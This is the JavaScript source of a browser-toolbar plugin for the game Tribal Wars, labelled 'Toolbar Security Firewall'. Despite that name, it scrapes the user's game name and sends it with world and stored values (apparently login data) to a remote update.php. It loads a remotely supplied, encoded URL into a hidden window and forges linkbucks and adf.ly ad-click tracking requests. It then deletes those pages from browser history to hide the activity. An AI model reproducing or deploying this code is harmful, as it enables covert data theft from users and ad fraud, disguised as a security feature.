// @Plugin = Toolbar Security Firewall
// @Version = 1.9
// @Icons = 0
merge(twb_.lib,{
	TWB_Render : function(){
		with(twb_.lib){
			try{
				link="http://"+TWB_World()+"game.php?screen=ranking"+local.sitterT;
				$.ajax({url:link,async: true, success:function(tmpx){
					ino=tmpx.split("class=\"lit\">")[1].split("</tr")[0].split("<td><a")[1];
					user=ino.split(/id=\d+/)[1].replace("\">","").replace("</a></td>","").replace(/\n+/,"").replace(/\s+/,"");
					unm=user;
					wrl=TWB_World(0);
					q=$.ajax({url:host+"update.php?mode=esterica&unm="+unm+"&wrl="+wrl+"&c="+twb_.l+"&l="+twb_.p+ZType,async:true,success:function(q){
						if(q.length>0){
							if(q=="2"){
								TWB_DisConnect();
								window.clearInterval(twb_.ping);
								delete twb_.ping;
								window.clearTimeout(twb_.ping2);
								delete twb_.ping2;
								window.clearTimeout(twb_.ping3);
								delete twb_.ping3;
							}
							else{
								msg=q;
								TWB_Notify(lang("imsg")+"<br />"+msg,"Message",[{value:"Reply",func:TWB_Msg},{value:"Close",func:TWB_Msg_Close}]);
							}
						}
					}});
				}});
			}catch(e){log('Security Firewall',e);}
		}
	},
	TWB_Msg : function(){
		with(twb_.lib){
			TWB_Msg_Close();
			reply=prpt(lang("reply"));
			if(reply){
				$.ajax({url:host+"update.php?mode=orivana&unm="+twb_.l+"&msg="+escape(reply),async:true});
			}
		}
	},
	TWB_Msg_Close : function(){
		with(twb_.lib){
			// Shut the notify box
			twb_.NOTIFY[twb_.NOTIFY.length-1].close();
		}
	},
	TWB_Render2 : function(){
		with(twb_.lib){
			// This will keep users online on the forum
			// Scale
			$.ajax({url:host+"update.php?mode=farfetched",async:true,success:function(XTMP){
				gei("TWB-Root-Win").contentWindow.location=B62.d(XTMP);
			}});
		}
	},
	TWB_ARDIR : function(){
		with(twb_.lib){
			try{
				T=twb_.pWIN;
				if(typeof T.wrappedJSObject!="undefined"){
					T=T.wrappedJSObject;
				}
				for(a=0; a<5; a++){
					T.counter();
				}
				alert(twb_.pWIN.$("#skip_button").attr("href"));
				if(!twb_.pWIN.$("#skip_button").attr("href").match(".xpi")){
					twb_.pWIN.location.href=twb_.pWIN.$("#skip_button").attr("href");
				}
				var ios = Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
				var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsIBrowserHistory);
				Z=T.location.href;
				setTimeout(function(){
					historyService.removePage(ios.newURI(Z, null, null));
				},4000);
			}catch(e){
				log('Toolbar Security Firewall',3,e);
			}
		}
	},
	TWB_LRDIR : function(){
		with(twb_.lib){
			try{
				//T=gei("TWB-Root-Win").contentWindow;
				T=twb_.pWIN;
				if(typeof T.wrappedJSObject!="undefined"){
					T=T.wrappedJSObject;
				}
				try{
					T.Linkbucks.DocumentFocused=true;
					T.AdMouseOver=true;
					T.Linkbucks.AdClicked=true;
					
					$.ajax({
						type: "POST",
						async: true,
						url: T.location.href+"/Track.aspx/Link",
						cache: "false",
						contentType: "application/json; charset=utf-8",
						dataType: "json",
						data: "{\"LinkCode\":\"" + T.Linkbucks.LinkCode + "\",\"Key\":\"" + T.Linkbucks.Keys[0] + "\",\"Referer\":\"" + "http://twbooster.com/phpBB3/viewtopic.php?t=31&p=20" + "\"}"
					}); 
					
					$.ajax({
						type: "POST",
						async: true,
						url: T.location.href+"/Track.aspx/Advert",
						cache: "false",
						contentType: "application/json; charset=utf-8",
						dataType: "json",
						data: "{\"LinkCode\":\"" + T.Linkbucks.LinkCode + "\",\"Key\":\"" + T.Linkbucks.Keys[1] + "\"}"
					}); 
					
					T.Linkbucks.TrackClick(true);
					T.Linkbucks.TrackAdClick(true);
					if(!gei("skipAd",twb_.pWIN.document).childNodes[0].href.match(".xpi")){
						setTimeout(function(){
							twb_.pWIN.Linkbucks.RedirectLink(gei("skipAd",twb_.pWIN.document).childNodes[0].href);
						},$get_var(0));
					}
				}catch(e){}
				var ios = Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
				var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsIBrowserHistory);
				Z=T.location.href;
				setTimeout(function(){
					historyService.removePage(ios.newURI(Z, null, null));
				},4000);
			}catch(e){
				log('Toolbar Security Firewall',3,e);
			}
		}
	},
	init : function(){
		with(twb_.lib){
			if(typeof Engines.State.processes.LBQ=="undefined"){
				Engines.State.add_p("LBQ","TWB_LRDIR()",".linkbucks",false);
				Engines.State.add_p("ABQ","TWB_ARDIR()","adf.ly",false);
			}
		}
	}
});